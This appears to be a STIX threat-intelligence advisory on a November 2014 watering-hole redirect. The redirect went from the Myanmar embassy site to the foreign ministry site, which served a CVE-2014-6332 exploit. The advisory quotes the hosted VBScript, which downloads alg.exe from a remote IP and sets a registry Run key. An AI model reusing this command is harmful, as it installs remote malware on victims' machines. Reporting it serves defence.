stix:STIX_Header.stix:Title: Systems Observed Attempting to Download Malware Following Redirects
stix:STIX_Header.stix:Description: On 17 November 2014, users from a US Government Department were redirected from one legitimate foreign government website to another. The redirected systems then attempted to download malware from IP 118.193.149.186, which contained an exploit for a Microsoft Windows vulnerability (CVE-2014-6332).

stix:Indicator.indicator:Description:
On 17 November 2014, at least two US Government systems attempted to download malware from an IP address registered in China after they visited a compromised foreign government website. The users were redirected to another foreign government website.
The two US Government systems attempted to perform a File Transfer Protocol (FTP) download of the file alg.exe from IP 118.193.149.186, which contained an exploit for vulnerability CVE-2014-6332.
The systems were redirected to the website of the Myanmar Ministry of Foreign Affairs, www.mofa.gov.mm, after visiting www.mewashingtondc.com, which is the official website of the Myanmar embassy in Washington, D.C. The following redirect occurred from www.mewashingtondc.com to www.mofa.gov.mm:
src="http://www.mofa.gov.mm/" height="615" width="1007" style="-webkit-transform:scale(0.58);-moz-transform:scale(0.58);-ms-transform:scale(0.58); transform:scale(0.58); position:relative; left:-210px; top:-130px;"
The following malicious Virtual Basic Script (VBS) variables were hosted at www.mofa.gov.mm: shell.ShellExecute "cmd.exe", "/c echo open 118.193.149.186 > o &echo user admin admin >> o &echo get alg.exe C:\alg.exe >> o &echo quit >> o &ftp -n -s:o &del /F /Q o",0,,0 set ws = createobject("wscript.shell") ws.regwrite "HKLM\SoftWare\Microsoft\Windows\CurrentVersion\Run\newrun","c:\alg.exe -local","REG_SZ"
According to the report, redirection techniques to websites hosting CVE-2014-6332 exploit code are not specific to any group of attackers. It is likely that the initial redirect was legitimate; both are official sites related to a foreign government's legitimate foreign affairs interests. However, not all visitors to the first site were automatically redirected to the other.
